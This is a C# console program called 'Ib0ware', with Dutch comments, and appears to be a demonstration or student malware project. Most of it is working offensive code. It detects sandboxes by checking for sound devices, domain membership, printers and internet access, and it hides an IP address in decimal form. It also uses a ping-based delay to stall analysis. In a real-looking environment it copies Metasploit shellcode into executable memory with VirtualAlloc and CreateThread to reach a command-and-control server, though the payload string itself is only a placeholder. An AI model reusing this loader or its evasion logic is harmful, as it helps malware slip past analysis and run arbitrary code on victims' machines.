using System;
using System.IO;
using System.Runtime.InteropServices;
using NAudio.CoreAudioApi;             // Library voor het opvragen van de sound outputs
using System.Net.NetworkInformation;  // Library voor het opvragen van netwerkinformatie. Deze wordt gebruikt voor de ping delay.

namespace Ib0ware
{
    class Program
    {
        //Initializeren van de paramenters.
        public static int nsoutputs = 0;
        public static int nprinters = 0;

        public static bool routputs = false;
        public static bool rprinters = false;
        public static bool riconnection = false;
        public static bool radcheck = false;
        public static bool result = false;
        public static bool resultmaybe = false;
        

        //Functie voor het opvragen van de sound outputs
        public static void EnumerateAudio()
        {
            var enumerator = new MMDeviceEnumerator();
            foreach (var endpoint in enumerator.EnumerateAudioEndPoints(DataFlow.Render, DeviceState.Active))
            {
                Console.WriteLine(endpoint.FriendlyName);
                nsoutputs++;
            }
            Console.WriteLine("");
            Console.WriteLine("Number of detected sound outputs:{0}", nsoutputs);

            if (nsoutputs > 0)
                routputs = true;
        }

        //Functie voor het opvragen van de printers
        public static void EnumeratePrinters()
        {
            foreach (string printer in System.Drawing.Printing.PrinterSettings.InstalledPrinters)
            {
                Console.WriteLine(printer);
                nprinters++;
            }
            Console.WriteLine("");
            Console.WriteLine("Number of detected printers:{0}", nprinters);

            if (nprinters > 0)
                rprinters = true;
        }

        //Functie om te controleren of de computer onderdeel is van het AD
        public static void ADCheck()
        {
            string domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
            if (domain == "")
            {
                Console.WriteLine("This computer is not currently joined to a domain");
            }
            else
            {
                Console.WriteLine("This computer is currently joined to the domain: ");
                Console.WriteLine(domain);
                radcheck = true;
            }

        }

        //Functie die voor vertraging zorgt door het uitvoeren van een ping commando.
        public static void HoldUp()
        {
            Ping pingSender = new Ping();
            PingReply reply = pingSender.Send("2147483646");//Loopback IP adres 127.255.255.254 in decimale waarde voor obfuscation   

            if (reply.Status == IPStatus.Success)
            {
                int counter = 0;
                Console.WriteLine("Sit back and enjoy the ride.", reply.Address.ToString());
                while (counter < 250)
                {
                    Console.WriteLine("You have {0} steps to the finish line.", counter);
                    counter++;

                  System.Threading.Thread.Sleep(1000);
                }
                Console.WriteLine("You have reached the finish line.");
            }
            else
            {
                Console.WriteLine(reply.Status);
            }
        }

        //Functie die voor vertraging zorgt door het uitvoeren van een ping commando.
        public static bool CheckForInternet()
        {
            try
            {
                Ping myPing = new Ping();
                String host = "134744072";
                byte[] buffer = new byte[32];
                int timeout = 1000;
                PingOptions pingOptions = new PingOptions();
                PingReply reply = myPing.Send(host, timeout, buffer, pingOptions);
                Console.WriteLine("This environment has internet connection !");
                riconnection = true;
                return (reply.Status == IPStatus.Success);
            }
            catch (Exception)
            {
                Console.WriteLine("This environment has NO internet connection !");
                riconnection = false;
                return false;
            }
        }

        //Functie die de berekening uitvoert om te detecteren in welke omgeving de code wordt uitgevoerd.
        public static void DetectZandbox()
        {
            if ((routputs == false) || (radcheck == false))
            {
                Console.WriteLine("Zandbox environment detected :)");
                result = true;
            }

            else if((routputs == true && radcheck == true && rprinters == false && riconnection == false)|| (routputs == true && radcheck == true && rprinters == true && riconnection == false)|| (routputs == true && radcheck == true && rprinters == false && riconnection == true))
            {
                Console.WriteLine("This is maybe a Zandbox environment :|");
                resultmaybe = true;
            }

            else
            {
                Console.WriteLine("Usual environment detected :(");
                result = false;
                resultmaybe = false;
            }
                
        }

        //Functie die bepaalde welke output er wordt gegeneerd op basis van de omgeving.
        public static void MakeAChoice()
        {
            if (result == true)
            {
                Console.WriteLine("Try Again !");
            }

            else if (resultmaybe == true)
            {
                Console.WriteLine("Do you want to play a game ?");
                HoldUp();
                DropFile(nsoutputs);
            }

            else {
                DropFile(nsoutputs);
                Console.WriteLine();
            }
        }

        //Functie de kwaadaardige code uitvoert.
        public static void DropFile(int a)
        {

            string payload = "PAYLOAD_HERE"; //MSFCONSOLE, zie PDF.
            string[] Xpayload = payload.Split(',');
            byte[] X_Final = new byte[Xpayload.Length];
            for (int i = 0; i < Xpayload.Length; i++)
            {
                X_Final[i] = Convert.ToByte(Xpayload[i], 16);
            }
            uint MEM_COMMIT = 0x1000;
            uint PAGE_EXECUTE_READWRITE = 0x40;
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("Making connection with C&C ;)");
            uint funcAddr = VirtualAlloc(0x0000, (uint)X_Final.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(X_Final, 0x0000, (IntPtr)(funcAddr), X_Final.Length);
            IntPtr hThread = IntPtr.Zero;
            uint threadId = 0x0000;
            IntPtr pinfo = IntPtr.Zero;
            hThread = CreateThread(0x0000, 0x0000, funcAddr, pinfo, 0x0000, ref threadId);
            WaitForSingleObject(hThread, 0xffffffff);
        }

        //Functie die de tijd toont.
        public static void PrintTime()
        {
            DateTime now = DateTime.Now;
            Console.WriteLine(now);
        }

        
        //Hoofdfunctie
        static void Main()
        {
            Console.SetWindowSize(100, 40);
            Console.Title = "-| Ib0ware |-";
            Console.ForegroundColor = ConsoleColor.Black;
            Console.BackgroundColor = ConsoleColor.White;
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("---------------------------------------------------------");
            Console.ForegroundColor = ConsoleColor.Black;
            Console.WriteLine("Tool:    Ib0ware");
            Console.WriteLine("Project: Hunting Mal_ware like a boss");

            Console.Write("Starting Time:");
            PrintTime();
            Console.WriteLine();
            Console.WriteLine("-------------------------F-A-S-E-1-----------------------");

            Console.WriteLine("Step 1: Detecting sound outputs.");
            Console.WriteLine();
            EnumerateAudio();

            Console.WriteLine("---------------------------------------------------------");

            Console.WriteLine("Step 2: Detecting if computer is joined the AD");
            Console.WriteLine();
            ADCheck();

            Console.WriteLine("---------------------------------------------------------");

            Console.WriteLine("Step 3: Detecting printers.");
            Console.WriteLine();
            EnumeratePrinters();

            Console.WriteLine("---------------------------------------------------------");

            Console.WriteLine("Step 4: Checking internet connectifity");
            Console.WriteLine();
            CheckForInternet();

            Console.WriteLine();
            Console.WriteLine("-------------------------F-A-S-E-2-----------------------");

            Console.WriteLine("Step 5: Detecting environment.");
            Console.WriteLine();
            DetectZandbox();

            Console.WriteLine();
            Console.WriteLine("-------------------------F-A-S-E-3-----------------------");

            Console.WriteLine("Step 6: Making a choice based on environment.");
            Console.WriteLine();
            MakeAChoice();

            Console.WriteLine("---------------------------------------------------------");

            Console.WriteLine();
            Console.WriteLine("Press any key to continue...");
            Console.ReadKey(true);
            Console.Write("Ending Time:");
            PrintTime();
            Console.ReadKey(true);
            Console.ReadLine();
        }
        [DllImport("kernel32")]
        private static extern uint VirtualAlloc(uint lpStartAddr, uint size, uint flAllocationType, uint
       flProtect);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(uint lpThreadAttributes, uint dwStackSize, uint lpStartAddress,
       IntPtr param, uint dwCreationFlags, ref uint lpThreadId);
        [DllImport("kernel32")]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    }
}
